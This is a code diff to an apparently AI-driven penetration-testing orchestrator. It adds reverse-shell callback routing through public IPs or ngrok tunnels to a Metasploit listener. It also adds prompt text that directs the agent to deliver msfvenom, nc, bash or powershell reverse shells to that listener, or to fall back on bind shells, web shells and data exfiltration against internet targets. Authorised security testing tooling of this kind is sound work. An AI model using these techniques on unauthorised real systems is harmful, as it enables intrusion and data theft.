@@ -50,6 +50,7 @@ from core import playbooks as _playbooks
 from core import coverage as _coverage
 from core import vuln_validate as _vuln_validate
 from core import exploit_map as _exploit_map
+from core import callback as _callback
 from core.bruteforce_worker import BruteforceWorker
 
 logger = logging.getLogger(__name__)
@@ -439,6 +440,14 @@ class Session:
         self.exploit_lport: int = 0
         self.exploit_payload: str = ""
         self._auto_handler_started: bool = False
+        # Reverse-shell callback routing (set when the handler auto-starts). The
+        # advertised LHOST above is what the target dials; these describe HOW it
+        # is routed and whether we are confident the target can reach it, so the
+        # AI can pick a tunnel or a non-callback technique for NATed real targets.
+        self.callback_mode: str = ""          # local | public | ngrok | manual
+        self.callback_reachable: bool = True  # confidence the target can call back
+        self.callback_note: str = ""          # human/AI explanation
+        self.callback_bind: str = ""          # local bind socket host:port
 
         # Operator steering: free-text instructions the user sends mid-engagement
         # ("focus on GlassFish", "skip SMB", "try Ghostcat on 8009"). Injected as a
@@ -527,6 +536,10 @@ class Orchestrator:
         # Each manager holds the persistent msfconsole multi/handler process(es)
         # and tracks active meterpreter/shell connections for that session.
         self._shell_managers: Dict[str, ShellManager] = {}
+
+        # Reverse-shell callback tunnels (e.g. an ngrok process) keyed by
+        # session_id, so they can be torn down when the session ends.
+        self._callback_tunnels: Dict[str, Any] = {}
 
         # Decoupled brute-force workers — one per pentest session (M5).
         self._brute_workers: Dict[str, BruteforceWorker] = {}
@@ -1568,6 +1581,10 @@ class Orchestrator:
             # handler so caught sessions show up in the Shells tab.
             _exhausted_ctx += self._handler_context_block(session)
 
+            # Callback reachability — for a NATed public target, steer the AI
+            # toward tunnels or non-callback techniques before exploitation.
+            _exhausted_ctx += self._reachability_context_block(session)
+
             # Force-command directive — appended when recovering from an empty
             # response so the model is compelled to emit a concrete next command.
             if force_command:
@@ -2322,7 +2339,7 @@ Subdomains found: {len(session.discovered_subdomains)}{f' — [{", ".join(sessio
 Web apps found: {len(session.web_applications)}{f' — [{", ".join(a.get("url","") for a in session.web_applications[:5])}]' if session.web_applications else ''}
 API endpoints: {len(session.discovered_api_endpoints)}
 Auto-execution depth: {session.auto_depth_counter}/{session.max_auto_depth}
-{self._operator_context_block(session)}{self._osint_context_block(session)}{self._coverage_context_block(session)}{self._exploit_hints_block(session)}{self._exhausted_context_block(session)}{self._compromise_context_block(session)}{self._handler_context_block(session)}
+{self._operator_context_block(session)}{self._osint_context_block(session)}{self._coverage_context_block(session)}{self._exploit_hints_block(session)}{self._exhausted_context_block(session)}{self._compromise_context_block(session)}{self._handler_context_block(session)}{self._reachability_context_block(session)}
 Domain rule: If Target Domain is provided ({session.target_domain}), use domain name for all web tools — never IP.
 
 {self._get_relevant_threat_intel_context(session_id)}
@@ -3107,8 +3124,18 @@ Domain rule: If Target Domain is provided ({session.target_domain}), use domain 
             return None
         session._auto_handler_started = True  # set first so concurrent calls no-op
         try:
-            lhost = os.getenv("EXPLOIT_LHOST", "").strip() or get_local_ip()
-            lport = int(os.getenv("EXPLOIT_LPORT", "4444"))
+            # Resolve a callback address the TARGET can actually route back to.
+            # For a LAN lab this is the local IP; for a real internet target
+            # behind NAT it is a public IP, an ngrok tunnel, or a manual
+            # reverse-SSH endpoint — otherwise the reverse shell never arrives.
+            # Runs in a thread because it may do network I/O (public IP / ngrok).
+            # run_in_executor (not asyncio.to_thread) for Python 3.8 compatibility.
+            _loop = asyncio.get_event_loop()
+            cb = await _loop.run_in_executor(
+                None, _callback.resolve_callback, session.target_ip
+            )
+            lhost = cb.advertised_host
+            lport = cb.advertised_port
             payload = self._guess_default_payload(session)
 
             mgr = self._get_shell_manager(session_id)
@@ -3117,10 +3144,20 @@ Domain rule: If Target Domain is provided ({session.target_domain}), use domain 
                 on_session_opened=lambda hid, info: self._persist_shell_session(
                     session_id, hid, info
                 ),
+                bind_host=cb.bind_host, bind_port=cb.bind_port,
             )
             session.exploit_lhost = lhost
             session.exploit_lport = lport
             session.exploit_payload = payload
+            # Remember the callback details so the AI prompt can explain the
+            # routing and warn when the path is not confidently reachable.
+            session.callback_mode = cb.mode
+            session.callback_reachable = cb.reachable
+            session.callback_note = cb.note
+            session.callback_bind = f"{cb.bind_host}:{cb.bind_port}"
+            # Keep the tunnel process (if any) for cleanup on session end.
+            if cb.tunnel_proc is not None:
+                self._callback_tunnels[session_id] = cb.tunnel_proc
 
             # Persist handler config for the Shells tab + restart recovery.
             try:
@@ -3139,15 +3176,23 @@ Domain rule: If Target Domain is provided ({session.target_domain}), use domain 
 
             logger.info(
                 f"Session {session_id}: auto-started exploitation handler "
-                f"{handler.handler_id} at {lhost}:{lport} payload={payload}"
+                f"{handler.handler_id} advertising {lhost}:{lport} "
+                f"(bind {cb.bind_host}:{cb.bind_port}, mode={cb.mode}, "
+                f"reachable={cb.reachable}) payload={payload}"
+            )
+            _reach = (
+                "" if cb.reachable else
+                " WARNING: this callback may NOT be reachable from the target — "
+                "if no shell arrives, use a tunnel (CALLBACK_MODE=ngrok / a reverse-"
+                "SSH endpoint via EXPLOIT_LHOST) or a non-callback technique."
             )
             # Visible timeline entry so the operator sees the listener came up.
             _d = {
                 "timestamp": datetime.now().isoformat(),
                 "reasoning": (
-                    f"Auto-started Metasploit multi/handler at {lhost}:{lport} "
-                    f"(payload {payload}). Exploits will deliver their reverse shell "
-                    "here; caught sessions appear in the Shells tab."
+                    f"Auto-started Metasploit multi/handler. Payloads must call back "
+                    f"to {lhost}:{lport} (payload {payload}); the listener binds "
+                    f"{cb.bind_host}:{cb.bind_port} [mode={cb.mode}]. {cb.note}{_reach}"
                 ),
                 "suggested_command": "",
                 "risk_level": "low",
@@ -3718,8 +3763,21 @@ Domain rule: If Target Domain is provided ({session.target_domain}), use domain 
             conn.close()
         except sqlite3.Error as e:
             logger.error(f"Failed to mark session {session_id} completed in DB: {e}")
+        self._cleanup_callback_tunnel(session_id)
         logger.info(f"Session {session_id} marked as completed")
         return {"status": "success", "session_id": session_id}
+
+    def _cleanup_callback_tunnel(self, session_id: str) -> None:
+        """Terminate any reverse-shell callback tunnel (e.g. ngrok) started for
+        this session. Best-effort; never raises."""
+        proc = self._callback_tunnels.pop(session_id, None)
+        if proc is None:
+            return
+        try:
+            proc.terminate()
+            logger.info(f"Session {session_id}: stopped callback tunnel")
+        except Exception as e:
+            logger.warning(f"Session {session_id}: failed to stop callback tunnel: {e}")
 
     def get_session_history(self) -> List[Dict]:
         """Return summary rows for ALL sessions in the DB (including completed/failed).
@@ -5122,21 +5180,64 @@ Web apps: {webapps}
         Empty until the handler has been auto-started (exploitation stage)."""
         if not session.exploit_lhost:
             return ""
+        _bind = session.callback_bind or f"{session.exploit_lhost}:{session.exploit_lport}"
+        _reach_line = (
+            "  - Callback path is CONFIRMED reachable for this target.\n"
+            if session.callback_reachable else
+            "  - WARNING: this callback may NOT be reachable from the target (it is "
+            "on the public internet and the listener is behind NAT / not port-"
+            "forwarded). If a reverse shell does not connect within a minute, DO "
+            "NOT keep retrying the same payload. Prefer a technique that needs no "
+            "inbound callback: a BIND shell (target listens, you connect in), a web "
+            "shell / in-band command execution over the exploited service, or data "
+            "exfil over the existing connection. A tunnel (ngrok / reverse-SSH) can "
+            "also be configured by the operator via CALLBACK_MODE / EXPLOIT_LHOST.\n"
+        )
         return (
             "\n=== MANAGED PAYLOAD LISTENER (deliver your shells HERE) ===\n"
-            f"A Metasploit multi/handler is LISTENING:\n"
-            f"  LHOST   = {session.exploit_lhost}\n"
+            f"A Metasploit multi/handler is LISTENING (callback mode: "
+            f"{session.callback_mode or 'local'}):\n"
+            f"  LHOST   = {session.exploit_lhost}   <- payloads dial THIS (advertised)\n"
             f"  LPORT   = {session.exploit_lport}\n"
             f"  PAYLOAD = {session.exploit_payload}\n"
-            "When you exploit, your reverse payload MUST connect back to this "
-            "LHOST:LPORT using this payload — then the session is caught and "
-            "controllable in the Shells tab. Rules:\n"
+            f"  (listener binds locally on {_bind}; the LHOST above is the address "
+            "the target must reach, which may be a tunnel/public IP)\n"
+            "When you exploit, your reverse payload MUST connect back to LHOST:LPORT "
+            "using this payload — then the session is caught in the Shells tab. Rules:\n"
             f"  - msfvenom: use LHOST={session.exploit_lhost} LPORT={session.exploit_lport} "
             f"-p {session.exploit_payload}\n"
             "  - Metasploit exploit modules: set LHOST/LPORT/PAYLOAD to the above; do NOT "
             "run your own multi/handler — one is already listening.\n"
             "  - Non-msf reverse shells (nc, bash -i, powershell): point them at "
             f"{session.exploit_lhost}:{session.exploit_lport}.\n"
+            f"{_reach_line}"
+        )
+
+    def _reachability_context_block(self, session: "Session") -> str:
+        """For a public/internet target, remind the AI early that a reverse shell
+        only works if the target can route back to the operator. Fades once the
+        managed handler is up (then _handler_context_block carries the specifics).
+        Silent for LAN labs, where the local IP is reachable."""
+        if _is_local_target(session.target_ip) or session._auto_handler_started:
+            return ""
+        _configured = bool(
+            os.getenv("EXPLOIT_LHOST", "").strip()
+            or os.getenv("CALLBACK_MODE", "").strip().lower() in ("ngrok", "public", "manual")
+        )
+        _hint = (
+            "A reachable callback (tunnel / public IP) appears to be configured — "
+            "reverse payloads should use the managed listener once it starts."
+            if _configured else
+            "No public callback is configured, and a private LHOST is NOT reachable "
+            "from an internet target behind NAT. When you reach exploitation, PREFER "
+            "techniques that need no inbound callback: bind shells, web shells / "
+            "in-band command execution over the exploited service, or reading data "
+            "back through the existing connection. Only use a reverse shell if the "
+            "operator has set up a tunnel (CALLBACK_MODE=ngrok or EXPLOIT_LHOST)."
+        )
+        return (
+            "\n=== CALLBACK REACHABILITY (public target) ===\n"
+            f"Target {session.target_ip} is on the public internet. {_hint}\n"
         )
 
     def _compromise_context_block(self, session: "Session") -> str:
@@ -5523,6 +5624,9 @@ Web apps: {webapps}
                     asyncio.create_task(_mgr.stop_all())
                 except Exception:
                     pass
+
+            # Tear down any reverse-shell callback tunnel (e.g. ngrok).
+            self._cleanup_callback_tunnel(session_id)
 
             # Remove from memory
             if session_id in self.sessions:
